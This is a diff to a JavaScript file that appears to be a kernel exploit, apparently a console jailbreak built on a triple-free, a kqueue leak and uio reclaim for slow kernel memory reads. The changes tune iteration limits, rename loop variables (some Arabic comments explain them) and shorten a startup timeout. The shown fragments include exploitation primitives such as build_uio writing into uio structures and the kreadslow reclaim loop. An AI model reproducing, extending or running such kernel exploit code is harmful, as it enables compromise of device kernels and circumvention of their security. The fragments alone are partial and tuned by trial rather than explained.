@@ -119,7 +119,7 @@ var IOV_THREAD_NUM = 6;
 var UIO_THREAD_NUM = 6;
 var MAIN_LOOP_ITERATIONS = 3;
 var TRIPLEFREE_ITERATIONS = 8;
-var KQUEUE_ITERATIONS = 5000;
+var KQUEUE_ITERATIONS = 4000;
 var MAX_ROUNDS_TWIN = 10;
 var MAX_ROUNDS_TRIPLET = 100;
 var MAIN_CORE = 0;
@@ -1567,9 +1567,9 @@ function leak_kqueue() {
   var count = 0;
 
   // استخدام الثابت العالمي بدل MAX_KQ المحلي
-  var max_iters = KQUEUE_ITERATIONS;
+  var MAX_KQ = KQUEUE_ITERATIONS;
 
-  while (count < max_iters) {
+  while (count < MAX_KQ) {
     count++;
 
     kq = kqueue();
@@ -1598,7 +1598,7 @@ function leak_kqueue() {
     break;
   }
 
-  if (count >= max_iters) {
+  if (count >= MAX_KQ) {
     log('leak_kqueue: exceeded KQUEUE_ITERATIONS');
     return false;
   }
@@ -1673,7 +1673,7 @@ function build_uio(uio, uio_iov, uio_td, read, addr, size) {
   write64(uio.add(0x30), addr);             // iov_base
   write64(uio.add(0x38), size);             // iov_len
 }
-var KREAD_MAX_ITERS = 10000; // بدل 10000 الهاردكود
+var KREAD_MAX_KQ = 10000; // بدل 10000 الهاردكود
 
 function kreadslow(addr, size) {
   debug('Enter kreadslow addr: ' + hex(addr) + ' size: ' + size);
@@ -1728,7 +1728,7 @@ function kreadslow(addr, size) {
   var zeroMemoryCount = 0;
 
   // Reclaim with uio.
-  while (count < KREAD_MAX_ITERS) {
+  while (count < KREAD_MAX_KQ) {
     if (debugging.info.memory.available === 0) {
       zeroMemoryCount++;
       if (zeroMemoryCount >= 5) {
@@ -1764,7 +1764,7 @@ function kreadslow(addr, size) {
     write(new BigInt(uio_sock_1), tmp, size);
   }
 
-  if (count >= KREAD_MAX_ITERS) {
+  if (count >= KREAD_MAX_KQ) {
     debug('kreadslow - Failed uio reclaim after ' + count + ' iterations');
     return BigInt_Error;
   }
@@ -2433,5 +2433,5 @@ setTimeout(function () {
       show_fail();
     }
   }
-}, 1000);
+}, 500);
 
